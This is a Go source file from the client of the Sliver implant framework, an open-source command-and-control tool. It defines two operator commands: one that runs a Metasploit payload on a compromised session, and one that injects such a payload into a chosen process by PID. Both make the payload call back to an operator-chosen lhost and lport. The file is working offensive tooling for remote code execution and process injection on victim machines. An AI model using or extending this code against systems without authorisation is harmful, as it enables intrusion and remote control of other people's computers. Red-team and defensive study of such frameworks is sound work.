package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"

	"github.com/bishopfox/sliver/client/spin"

	"github.com/desertbit/grumble"
)

func msf(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {

	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")

	if lhost == "" {
		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending payload %s %s/%s -> %s:%d ...",
		payloadName, session.OS, session.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	_, err := rpc.Msf(context.Background(), &clientpb.MSFReq{
		Request:    ActiveSession.Request(ctx),
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(Warn+"%s\n", err)
	} else {
		fmt.Printf(Info + "Executed payload on target\n")
	}
}

func msfInject(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {

	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")
	pid := ctx.Flags.Int("pid")

	if lhost == "" {
		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
		return
	}

	if pid == -1 {
		fmt.Printf(Warn+"Invalid pid '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
		payloadName, session.OS, session.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	_, err := rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
		Request:    ActiveSession.Request(ctx),
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		PID:        uint32(pid),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(Warn+"%s\n", err)
	} else {
		fmt.Printf(Info + "Executed payload on target\n")
	}
}
